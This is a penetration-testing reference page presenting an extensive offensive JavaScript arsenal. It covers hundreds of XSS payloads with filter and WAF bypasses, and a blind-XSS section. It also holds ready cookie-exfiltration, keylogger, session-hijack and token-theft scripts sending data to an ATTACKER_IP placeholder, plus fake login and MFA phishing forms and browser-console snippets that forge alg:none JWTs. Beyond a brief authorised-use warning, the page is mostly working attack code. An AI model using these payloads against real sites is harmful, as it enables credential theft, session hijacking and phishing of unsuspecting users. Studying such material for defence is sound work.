---
title: JavaScript-Based Attacks 
description: Every JavaScript attack technique a penetration tester must know — XSS in all forms, DOM manipulation, prototype pollution, CSP bypass, cookie theft, keylogging, CORS exploitation, WebSocket hijacking, postMessage abuse, and hundreds of battle-tested payloads with browser console commands.
navigation:
  icon: i-lucide-braces
  title: JavaScript Attacks
---

JavaScript runs in every browser on the planet. It reads cookies, modifies the DOM, sends HTTP requests, accesses local storage, and controls what users see and interact with. When an attacker controls JavaScript execution in a victim's browser, they control **everything** — session tokens, credentials, page content, and user actions.

This guide is the complete offensive JavaScript reference. Every attack. Every payload. Every browser console trick. Every bypass.

::warning
All techniques are for **authorized penetration testing and bug bounty programs only**. Executing JavaScript attacks against systems without explicit permission is illegal. XSS is consistently in the OWASP Top 10 because it is everywhere — and devastating when exploited.
::

## Cross-Site Scripting (XSS)

XSS is the king of JavaScript attacks. It occurs when an application includes untrusted data in its output without proper validation or encoding, allowing an attacker to execute arbitrary JavaScript in a victim's browser.

### XSS Types at a Glance

::card-group
  ::card
  ---
  title: Reflected XSS
  icon: i-lucide-arrow-left-right
  ---
  Payload is reflected from the server in the HTTP response. Requires the victim to click a crafted URL. One-time execution per click. Found in search forms, error messages, URL parameters.
  ::

  ::card
  ---
  title: Stored XSS
  icon: i-lucide-database
  ---
  Payload is permanently stored on the server (database, comment, profile). Every user who views the page gets hit. Most dangerous XSS type. Found in forums, comments, profiles, messages.
  ::

  ::card
  ---
  title: DOM-Based XSS
  icon: i-lucide-file-code
  ---
  Payload never touches the server. Vulnerability exists entirely in client-side JavaScript that processes user input unsafely. Found in `document.location`, `innerHTML`, `eval()`, `document.write()`.
  ::

  ::card
  ---
  title: Blind XSS
  icon: i-lucide-eye-off
  ---
  Payload is stored and executes in a context you cannot see — admin panels, support dashboards, log viewers. You submit the payload and wait for a callback. Found in contact forms, feedback, headers logged by backend.
  ::
::

### Reflected XSS Payloads

#### Basic Alert Payloads

```html [Classic Alert]
<script>alert('XSS')</script>
```

```html [Alert with Document Domain]
<script>alert(document.domain)</script>
```

```html [Alert with Cookie]
<script>alert(document.cookie)</script>
```

```html [Alert with Origin]
<script>alert(window.origin)</script>
```

```html [Confirm Box]
<script>confirm('XSS')</script>
```

```html [Prompt Box]
<script>prompt('XSS')</script>
```

```html [Console Log (Silent — No Popup)]
<script>console.log('XSS')</script>
```

```html [Print Function (PortSwigger Lab Style)]
<script>print()</script>
```

#### IMG Tag Payloads

```html [IMG onerror #1]
<img src=x onerror=alert('XSS')>
```

```html [IMG onerror #2 — document.domain]
<img src=x onerror=alert(document.domain)>
```

```html [IMG onerror #3 — document.cookie]
<img src=x onerror=alert(document.cookie)>
```

```html [IMG onerror #4 — backticks]
<img src=x onerror=alert(`XSS`)>
```

```html [IMG onerror #5 — no quotes]
<img src=x onerror=alert(1)>
```

```html [IMG onerror #6 — confirm]
<img src=x onerror=confirm(1)>
```

```html [IMG onerror #7 — eval]
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

```html [IMG onload]
<img src=https://via.placeholder.com/1 onload=alert('XSS')>
```

```html [IMG onmouseover]
<img src=x onmouseover=alert('XSS') style="width:100%;height:100%">
```

#### SVG Tag Payloads

```html [SVG onload #1]
<svg onload=alert('XSS')>
```

```html [SVG onload #2 — document.domain]
<svg onload=alert(document.domain)>
```

```html [SVG onload #3 — document.cookie]
<svg onload=alert(document.cookie)>
```

```html [SVG animate]
<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
```

```html [SVG set]
<svg><set onbegin=alert('XSS') attributeName=x to=1>
```

```html [SVG with script]
<svg><script>alert('XSS')</script></svg>
```

```html [SVG foreignObject]
<svg><foreignObject><body onload=alert('XSS')></foreignObject></svg>
```

```html [SVG use with data URI]
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='x' onerror='alert(1)'/></svg>#x">
```

#### Event Handler Payloads

```html [body onload]
<body onload=alert('XSS')>
```

```html [body onpageshow]
<body onpageshow=alert('XSS')>
```

```html [input onfocus autofocus]
<input onfocus=alert('XSS') autofocus>
```

```html [input onblur autofocus tabindex]
<input onblur=alert('XSS') autofocus><input autofocus>
```

```html [select onfocus autofocus]
<select onfocus=alert('XSS') autofocus>
```

```html [textarea onfocus autofocus]
<textarea onfocus=alert('XSS') autofocus></textarea>
```

```html [marquee onstart]
<marquee onstart=alert('XSS')>
```

```html [video onerror]
<video><source onerror=alert('XSS')>
```

```html [video onloadstart]
<video onloadstart=alert('XSS') autoplay><source src=x>
```

```html [audio onerror]
<audio src=x onerror=alert('XSS')>
```

```html [details ontoggle]
<details ontoggle=alert('XSS') open>click</details>
```

```html [div onmouseover]
<div onmouseover=alert('XSS') style="position:fixed;width:100%;height:100%">HOVER ME</div>
```

```html [a onmouseover]
<a onmouseover=alert('XSS')>click me</a>
```

```html [button onclick]
<button onclick=alert('XSS')>click</button>
```

```html [form onsubmit]
<form onsubmit=alert('XSS')><input type=submit>
```

```html [object onerror]
<object data=x onerror=alert('XSS')>
```

```html [iframe onload]
<iframe onload=alert('XSS')>
```

```html [math tag]
<math><mi xlink:href="javascript:alert('XSS')">click</mi></math>
```

```html [table background (legacy)]
<table background="javascript:alert('XSS')">
```

```html [style onload (IE)]
<style onload=alert('XSS')></style>
```

```html [keygen onfocus (deprecated)]
<keygen onfocus=alert('XSS') autofocus>
```

```html [isindex onmouseover (deprecated)]
<isindex type=image src=x onerror=alert('XSS')>
```

#### JavaScript Protocol Payloads

```html [a href javascript]
<a href="javascript:alert('XSS')">click me</a>
```

```html [a href javascript — no quotes]
<a href=javascript:alert(1)>click</a>
```

```html [iframe src javascript]
<iframe src="javascript:alert('XSS')">
```

```html [form action javascript]
<form action="javascript:alert('XSS')"><input type=submit>
```

```html [object data javascript]
<object data="javascript:alert('XSS')">
```

```html [embed src javascript (legacy)]
<embed src="javascript:alert('XSS')">
```

```html [button formaction javascript]
<button formaction="javascript:alert('XSS')">click</button>
```

```html [input formaction javascript]
<form><input type=submit formaction="javascript:alert('XSS')">
```

```html [a href with newlines]
<a href="java
script:alert('XSS')">click</a>
```

```html [a href with tabs]
<a href="java	script:alert('XSS')">click</a>
```

```html [a href with entities]
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')">click</a>
```

```html [a href with hex entities]
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert('XSS')">click</a>
```

#### Data URI Payloads

```html [iframe data URI]
<iframe src="data:text/html,<script>alert('XSS')</script>">
```

```html [iframe data URI base64]
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
```

```html [object data URI]
<object data="data:text/html,<script>alert('XSS')</script>">
```

```html [embed data URI]
<embed src="data:text/html,<script>alert('XSS')</script>">
```

### Filter Bypass Payloads

#### Case Manipulation

```html [Mixed Case]
<ScRiPt>alert('XSS')</ScRiPt>
```

```html [Upper Case]
<SCRIPT>alert('XSS')</SCRIPT>
```

```html [IMG Mixed Case]
<ImG sRc=x OnErRoR=alert('XSS')>
```

```html [SVG Mixed Case]
<SvG oNlOaD=alert('XSS')>
```

#### Tag Bypass

```html [Double Script Tags]
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

```html [Nested Script Tags]
<script>alert('XSS')</script//
```

```html [Script with Space Before Closing]
<script >alert('XSS')</script >
```

```html [Script with Null Byte]
<scri%00pt>alert('XSS')</scri%00pt>
```

```html [Script with Tab]
<script	>alert('XSS')</script>
```

```html [Script with Newline]
<script
>alert('XSS')</script>
```

```html [Script with Forward Slash]
<script/x>alert('XSS')</script>
```

```html [Closing Tag Without Matching Open]
</script><script>alert('XSS')</script>
```

#### Quote and Delimiter Bypass

```html [No Quotes]
<img src=x onerror=alert(1)>
```

```html [Backticks Instead of Quotes]
<img src=x onerror=alert(`XSS`)>
```

```html [Single Quotes]
<img src='x' onerror='alert(1)'>
```

```html [Escaped Quotes]
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

```html [Template Literals]
<img src=x onerror=alert`XSS`>
```

```html [Forward Slash Instead of Space]
<img/src=x/onerror=alert('XSS')>
```

```html [Encoded Forward Slash]
<img%20src=x%20onerror=alert('XSS')>
```

#### Parentheses Bypass

```html [Backtick Instead of Parentheses]
<img src=x onerror=alert`1`>
```

```html [throw Statement]
<img src=x onerror="window.onerror=alert;throw 1">
```

```html [location.hash]
<img src=x onerror=eval(location.hash.substr(1))>#alert(1)
```

```html [toString Override]
<img src=x onerror="({}).constructor.constructor('alert(1)')()">
```

```html [Function Constructor]
<img src=x onerror="Function('alert(1)')()">
```

```html [setTimeout]
<img src=x onerror=setTimeout('alert(1)')>
```

```html [setInterval]
<img src=x onerror=setInterval('alert(1)')>
```

```html [eval]
<img src=x onerror=eval('alert(1)')>
```

```html [Reflect.apply]
<img src=x onerror="Reflect.apply(alert,null,[1])">
```

```html [import()]
<img src=x onerror="import('data:text/javascript,alert(1)')">
```

#### Encoding Bypass

```html [HTML Entity Encoding]
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```

```html [Hex Entity Encoding]
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```

```html [Unicode Encoding]
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
```

```html [URL Encoding (Double)]
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
```

```html [Octal Encoding in JavaScript]
<script>eval('\141\154\145\162\164\050\061\051')</script>
```

```html [Hex Encoding in JavaScript]
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
```

```html [Unicode Escape in JavaScript]
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

```html [Base64 Decode and Eval]
<script>eval(atob('YWxlcnQoMSk='))</script>
```

```html [String.fromCharCode]
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

```html [JSFuck Style]
<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()(alert(1))</script>
```

#### WAF Bypass Payloads

```html [Double URL Encoded]
%253Csvg%2520onload%253Dalert(1)%253E
```

```html [HTML Comment Injection]
<!--><svg onload=alert(1)>-->
```

```html [Mutation XSS (mXSS)]
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

```html [SVG Namespace Confusion]
<svg><x><script>alert&#40;1)</script></x></svg>
```

```html [CDATA Section]
<svg><script>alert<![CDATA[(1)]]></script></svg>
```

```html [XML Encoding]
<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script></svg>
```

```html [Polyglot XSS]
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//\%0telerik/telerik\x00telerik//</stYle/</titLe/</telerik/</telerik/</telerik/</telerik/</telerik/</xss>&telerik[0telerik]=[1]//--!>\x3csVg/telerik\x00telerik/telerik<telerik/oNloAd=alert('XSS')//>\x3e
```

```html [Polyglot XSS — Shorter]
'"><img src=x onerror=alert(1)//
```

```html [Polyglot XSS — Universal]
'"--></style></script><svg/onload=alert(document.domain)>
```

```html [Angular Template Injection]
{{constructor.constructor('alert(1)')()}}
```

```html [Vue.js Template Injection]
{{_openBlock.constructor('alert(1)')()}}
```

```html [AngularJS Sandbox Escape (< 1.6)]
{{$on.constructor('alert(1)')()}}
```

### Stored XSS Payloads

#### Cookie Stealing

```html [Cookie Exfiltration via Image]
<script>new Image().src="http://ATTACKER_IP/steal?c="+document.cookie</script>
```

```html [Cookie Exfiltration via Fetch]
<script>fetch('http://ATTACKER_IP/steal?c='+document.cookie)</script>
```

```html [Cookie Exfiltration via XMLHttpRequest]
<script>
var x=new XMLHttpRequest();
x.open('GET','http://ATTACKER_IP/steal?c='+document.cookie);
x.send();
</script>
```

```html [Cookie Exfiltration via navigator.sendBeacon]
<script>navigator.sendBeacon('http://ATTACKER_IP/steal',document.cookie)</script>
```

```html [Cookie via Redirect]
<script>document.location='http://ATTACKER_IP/steal?c='+document.cookie</script>
```

```html [Cookie via Window.open]
<script>window.open('http://ATTACKER_IP/steal?c='+document.cookie)</script>
```

```html [Cookie via IMG (No Script Tag)]
<img src=x onerror="fetch('http://ATTACKER_IP/steal?c='+document.cookie)">
```

```html [Cookie via SVG (No Script Tag)]
<svg onload="navigator.sendBeacon('http://ATTACKER_IP/steal',document.cookie)">
```

#### Keylogging

```html [Basic Keylogger]
<script>
document.addEventListener('keypress', function(e) {
  new Image().src='http://ATTACKER_IP/keys?k='+e.key;
});
</script>
```

```html [Buffered Keylogger (Fewer Requests)]
<script>
var keys='';
document.addEventListener('keypress', function(e) {
  keys+=e.key;
  if(keys.length>10){
    navigator.sendBeacon('http://ATTACKER_IP/keys',keys);
    keys='';
  }
});
</script>
```

```html [Full Keylogger with Field Identification]
<script>
document.addEventListener('keyup', function(e) {
  var t=e.target;
  var data={
    key:e.key,
    field:t.name||t.id||t.type||'unknown',
    value:t.value,
    url:location.href
  };
  navigator.sendBeacon('http://ATTACKER_IP/log',JSON.stringify(data));
});
</script>
```

#### Session Hijacking

```html [Full Session Hijack]
<script>
fetch('http://ATTACKER_IP/hijack', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    url: location.href,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    referrer: document.referrer
  })
});
</script>
```

```html [Token Steal from DOM]
<script>
var token = document.querySelector('meta[name="csrf-token"]').content;
fetch('http://ATTACKER_IP/token?t='+token);
</script>
```

```html [Token Steal from JavaScript Variable]
<script>
setTimeout(function(){
  fetch('http://ATTACKER_IP/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: window.__INITIAL_STATE__,
      auth: window.authToken || window.jwt || '',
      cookie: document.cookie
    })
  });
}, 2000);
</script>
```

#### Phishing via XSS

```html [Login Form Injection]
<script>
document.body.innerHTML = '<h2>Session Expired — Please Login Again</h2>' +
  '<form action="http://ATTACKER_IP/phish" method="POST">' +
  '<input name="user" placeholder="Username" style="display:block;margin:10px;padding:8px;width:300px">' +
  '<input name="pass" type="password" placeholder="Password" style="display:block;margin:10px;padding:8px;width:300px">' +
  '<button type="submit" style="margin:10px;padding:8px 20px">Login</button></form>';
</script>
```

```html [MFA Code Phishing]
<script>
document.body.innerHTML = '<div style="text-align:center;padding:50px">' +
  '<h2>Additional Verification Required</h2>' +
  '<p>Enter the code sent to your phone</p>' +
  '<form action="http://ATTACKER_IP/mfa" method="POST">' +
  '<input name="code" placeholder="6-digit code" maxlength="6" style="font-size:24px;text-align:center;padding:10px;width:200px">' +
  '<br><button type="submit" style="margin:20px;padding:10px 30px">Verify</button></form></div>';
</script>
```

#### Page Defacement

```html [Simple Defacement]
<script>document.body.innerHTML='<h1>Hacked by XSS</h1>'</script>
```

```html [Redirect to Attacker Page]
<script>window.location='http://ATTACKER_IP/phishing-page'</script>
```

```html [Inject External Script]
<script src="http://ATTACKER_IP/malicious.js"></script>
```

```html [Inject External Script — Dynamic]
<script>
var s=document.createElement('script');
s.src='http://ATTACKER_IP/payload.js';
document.body.appendChild(s);
</script>
```

### DOM-Based XSS

#### Common DOM XSS Sources

::field-group
  ::field{name="document.URL" type="source"}
  The full URL of the current page. If the app reads from this and writes to the DOM unsafely, DOM XSS occurs.
  ::

  ::field{name="document.location" type="source"}
  The location object. Properties like `.hash`, `.search`, `.pathname` carry user-controlled data.
  ::

  ::field{name="document.referrer" type="source"}
  The URL of the page that linked to the current page. Attacker-controlled if the victim clicks an attacker's link.
  ::

  ::field{name="window.name" type="source"}
  Persists across navigations within the same tab. Attacker can set `window.name` before redirecting the victim.
  ::

  ::field{name="location.hash" type="source"}
  The URL fragment after `#`. Not sent to the server. Perfect for DOM-only attacks that leave no server-side trace.
  ::

  ::field{name="location.search" type="source"}
  The URL query string after `?`. Sent to the server but also accessible client-side.
  ::

  ::field{name="postMessage data" type="source"}
  Data received from `window.postMessage()`. If not origin-validated, any page can send malicious data.
  ::

  ::field{name="Web Storage" type="source"}
  `localStorage` and `sessionStorage` values. If an attacker can write to storage (via another XSS), these become tainted.
  ::
::

#### Common DOM XSS Sinks

| Sink | Risk Level | Description |
| ---- | ---------- | ----------- |
| `innerHTML` | :icon{name="i-lucide-flame"} Critical | Parses HTML including script-equivalent elements |
| `outerHTML` | :icon{name="i-lucide-flame"} Critical | Same as innerHTML but replaces the element itself |
| `document.write()` | :icon{name="i-lucide-flame"} Critical | Writes raw HTML to the document stream |
| `document.writeln()` | :icon{name="i-lucide-flame"} Critical | Same as `document.write()` with newline |
| `eval()` | :icon{name="i-lucide-flame"} Critical | Executes a string as JavaScript code |
| `setTimeout(string)` | :icon{name="i-lucide-flame"} Critical | Executes string argument as code after delay |
| `setInterval(string)` | :icon{name="i-lucide-flame"} Critical | Executes string argument as code repeatedly |
| `Function()` | :icon{name="i-lucide-flame"} Critical | Creates a new function from a string |
| `element.src` | :icon{name="i-lucide-triangle-alert"} High | Can load JavaScript protocol URIs |
| `element.href` | :icon{name="i-lucide-triangle-alert"} High | Can trigger JavaScript protocol on click |
| `element.action` | :icon{name="i-lucide-triangle-alert"} High | Form action with JavaScript protocol |
| `location.assign()` | :icon{name="i-lucide-triangle-alert"} High | Navigates to attacker URL |
| `location.replace()` | :icon{name="i-lucide-triangle-alert"} High | Navigates without history entry |
| `jQuery.html()` | :icon{name="i-lucide-flame"} Critical | jQuery equivalent of innerHTML |
| `jQuery.append()` | :icon{name="i-lucide-flame"} Critical | Appends parsed HTML |
| `jQuery.after()` | :icon{name="i-lucide-flame"} Critical | Inserts parsed HTML after element |

#### DOM XSS Payloads

```html [innerHTML via location.hash]
# If the page does: element.innerHTML = location.hash.substr(1)
# URL: http://target.com/page#<img src=x onerror=alert(1)>
```

```html [document.write via document.URL]
# If the page does: document.write(document.URL)
# URL: http://target.com/page?<script>alert(1)</script>
```

```html [eval via location.search]
# If the page does: eval(new URLSearchParams(location.search).get('data'))
# URL: http://target.com/page?data=alert(1)
```

```html [jQuery html() via hash]
# If the page does: $('#output').html(location.hash)
# URL: http://target.com/page#<img src=x onerror=alert(1)>
```

```html [jQuery selector injection]
# If the page does: $(location.hash)
# URL: http://target.com/page#<img src=x onerror=alert(1)>
```

```html [window.name XSS]
# Step 1: On attacker page:
<script>window.name='<img src=x onerror=alert(1)>';location='http://target.com/vulnerable'</script>
# Step 2: If target does: document.getElementById('x').innerHTML = window.name
```

```html [postMessage DOM XSS]
# If target listens for postMessage and uses data in innerHTML:
# On attacker page (in iframe or window.open):
<script>
var w = window.open('http://target.com/vulnerable');
setTimeout(function(){
  w.postMessage('<img src=x onerror=alert(document.domain)>','*');
}, 2000);
</script>
```

### Blind XSS Payloads

::note
Blind XSS payloads execute in a context you cannot observe directly — admin panels, support ticket systems, log viewers, email clients. You inject the payload and wait for it to call back to your server when an admin views it.
::

```html [Blind XSS — External Script Load]
"><script src=http://ATTACKER_IP/blind.js></script>
```

```html [Blind XSS — Image Callback]
"><img src=x onerror="new Image().src='http://ATTACKER_IP/blind?c='+document.cookie+'&u='+location.href">
```

```html [Blind XSS — Full Exfiltration]
"><script>
fetch('http://ATTACKER_IP/blind', {
  method:'POST',
  body:JSON.stringify({
    cookie:document.cookie,
    url:location.href,
    dom:document.documentElement.outerHTML.substr(0,5000),
    localStorage:JSON.stringify(localStorage),
    origin:location.origin
  })
});
</script>
```

```html [Blind XSS — Short Tag Injection Points]
"><svg onload=fetch('http://ATTACKER_IP/x?'+document.cookie)>
```

```html [Blind XSS — In HTTP Headers]
User-Agent: <script src=http://ATTACKER_IP/blind.js></script>
Referer: <script src=http://ATTACKER_IP/blind.js></script>
X-Forwarded-For: <script src=http://ATTACKER_IP/blind.js></script>
```

::tip
**Blind XSS Tool:** Use [XSS Hunter](https://xsshunter.trufflesecurity.com/) or self-hosted alternatives. They provide a JavaScript payload URL that automatically captures screenshots, cookies, DOM content, and more when triggered.
::

---

## Browser Console Attacks

Every pentester should be fluent in the browser developer console. Press :kbd{value="F12"} or :kbd{value="Ctrl"} + :kbd{value="Shift"} + :kbd{value="J"} to open it.

### Cookie Manipulation

```javascript [Read All Cookies]
document.cookie
```

```javascript [Read Specific Cookie]
document.cookie.split(';').find(c => c.trim().startsWith('session='))
```

```javascript [Set a Cookie]
document.cookie = "admin=true; path=/"
```

```javascript [Set Cookie with Expiry]
document.cookie = "role=admin; path=/; expires=Fri, 31 Dec 2025 23:59:59 GMT"
```

```javascript [Delete a Cookie]
document.cookie = "session=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/"
```

```javascript [Decode Base64 Cookie]
atob(document.cookie.split(';').find(c => c.includes('token')).split('=')[1])
```

```javascript [Decode URL-Encoded Cookie]
decodeURIComponent(document.cookie)
```

```javascript [List All Cookies as Object]
Object.fromEntries(document.cookie.split(';').map(c => c.trim().split('=')))
```

```javascript [Check HttpOnly Cookies (Invisible to JS)]
// HttpOnly cookies won't appear in document.cookie
// Use browser DevTools > Application > Cookies to see them
// If a session cookie IS visible in document.cookie, HttpOnly is NOT set — vulnerability!
console.log("Visible cookies:", document.cookie);
console.log("If session token is here, HttpOnly is missing!");
```

### Local Storage & Session Storage

```javascript [Read All localStorage]
JSON.stringify(localStorage, null, 2)
```

```javascript [Read All sessionStorage]
JSON.stringify(sessionStorage, null, 2)
```

```javascript [Read Specific Item]
localStorage.getItem('authToken')
```

```javascript [Set Item]
localStorage.setItem('role', 'admin')
```

```javascript [Remove Item]
localStorage.removeItem('authToken')
```

```javascript [Clear All Storage]
localStorage.clear()
sessionStorage.clear()
```

```javascript [Dump All Storage (Comprehensive)]
console.log("=== LocalStorage ===");
for(let i=0; i<localStorage.length; i++){
  let key = localStorage.key(i);
  console.log(key + ": " + localStorage.getItem(key));
}
console.log("=== SessionStorage ===");
for(let i=0; i<sessionStorage.length; i++){
  let key = sessionStorage.key(i);
  console.log(key + ": " + sessionStorage.getItem(key));
}
```

```javascript [Search Storage for Secrets]
let secrets = ['token','key','secret','password','auth','jwt','session','api'];
[localStorage, sessionStorage].forEach((store, idx) => {
  console.log(idx === 0 ? '=== localStorage ===' : '=== sessionStorage ===');
  for(let i=0; i<store.length; i++){
    let k = store.key(i);
    let v = store.getItem(k);
    if(secrets.some(s => k.toLowerCase().includes(s) || v.toLowerCase().includes(s))){
      console.warn('SENSITIVE:', k, '=', v);
    }
  }
});
```

### JWT Token Analysis

```javascript [Decode JWT from Cookie]
let token = document.cookie.split(';').find(c => c.includes('token')).split('=')[1];
let parts = token.split('.');
console.log("Header:", JSON.parse(atob(parts[0])));
console.log("Payload:", JSON.parse(atob(parts[1])));
console.log("Signature:", parts[2]);
```

```javascript [Decode JWT from localStorage]
let jwt = localStorage.getItem('jwt') || localStorage.getItem('token') || localStorage.getItem('authToken');
if(jwt){
  let [header, payload, sig] = jwt.split('.');
  console.log("Header:", JSON.parse(atob(header)));
  console.log("Payload:", JSON.parse(atob(payload)));
  let exp = JSON.parse(atob(payload)).exp;
  if(exp) console.log("Expires:", new Date(exp * 1000));
}
```

```javascript [Modify JWT Payload (Tamper)]
// WARNING: Only works if server doesn't verify signature (alg:none attack)
let jwt = localStorage.getItem('token');
let [header, payload, sig] = jwt.split('.');
let data = JSON.parse(atob(payload));
data.role = 'admin';
data.isAdmin = true;
let newPayload = btoa(JSON.stringify(data)).replace(/=/g,'');
let tampered = header + '.' + newPayload + '.' + sig;
localStorage.setItem('token', tampered);
console.log("Tampered JWT:", tampered);
```

```javascript [JWT alg:none Attack]
let jwt = localStorage.getItem('token');
let payload = JSON.parse(atob(jwt.split('.')[1]));
payload.role = 'admin';
let newHeader = btoa(JSON.stringify({"alg":"none","typ":"JWT"})).replace(/=/g,'');
let newPayload = btoa(JSON.stringify(payload)).replace(/=/g,'');
let forged = newHeader + '.' + newPayload + '.';
console.log("Forged JWT:", forged);
localStorage.setItem('token', forged);
```

### DOM Inspection & Manipulation

```javascript [Find All Forms]
document.querySelectorAll('form').forEach((f,i) => {
  console.log(`Form ${i}: action=${f.action} method=${f.method}`);
  f.querySelectorAll('input,textarea,select').forEach(el => {
    console.log(`  ${el.type||el.tagName}: name=${el.name} value=${el.value}`);
  });
});
```

```javascript [Find Hidden Fields]
document.querySelectorAll('input[type=hidden]').forEach(el => {
  console.log(`Hidden: name=${el.name} value=${el.value}`);
});
```

```javascript [Find All Links]
document.querySelectorAll('a[href]').forEach(a => console.log(a.href));
```

```javascript [Find All External Links]
document.querySelectorAll('a[href]').forEach(a => {
  if(!a.href.includes(location.hostname)) console.log('External:', a.href);
});
```

```javascript [Find All JavaScript Files]
document.querySelectorAll('script[src]').forEach(s => console.log(s.src));
```

```javascript [Find All Comments in HTML]
let walker = document.createTreeWalker(document, NodeFilter.SHOW_COMMENT);
while(walker.nextNode()) console.log('Comment:', walker.currentNode.textContent);
```

```javascript [Find CSRF Tokens]
let tokens = document.querySelectorAll('input[name*="csrf"],input[name*="token"],meta[name*="csrf"]');
tokens.forEach(t => console.log(`${t.name||t.getAttribute('name')}: ${t.value||t.content}`));
```

```javascript [Find Password Fields (Autofill Check)]
document.querySelectorAll('input[type=password]').forEach(p => {
  console.log(`Password field: name=${p.name} id=${p.id} autocomplete=${p.autocomplete} value=${p.value}`);
});
```

```javascript [Reveal All Password Fields]
document.querySelectorAll('input[type=password]').forEach(p => p.type = 'text');
```

```javascript [Remove Max Length Restrictions]
document.querySelectorAll('input[maxlength]').forEach(el => el.removeAttribute('maxlength'));
```

```javascript [Enable Disabled Fields]
document.querySelectorAll('[disabled]').forEach(el => el.disabled = false);
```

```javascript [Remove Readonly Attributes]
document.querySelectorAll('[readonly]').forEach(el => el.removeAttribute('readonly'));
```

```javascript [Show Hidden Elements]
document.querySelectorAll('[style*="display:none"],[style*="display: none"],.hidden,[hidden]').forEach(el => {
  el.style.display = 'block';
  el.hidden = false;
  el.classList.remove('hidden');
});
```

```javascript [Bypass Client-Side Validation]
// Remove all form validation
document.querySelectorAll('form').forEach(f => f.noValidate = true);
document.querySelectorAll('[required]').forEach(el => el.removeAttribute('required'));
document.querySelectorAll('[pattern]').forEach(el => el.removeAttribute('pattern'));
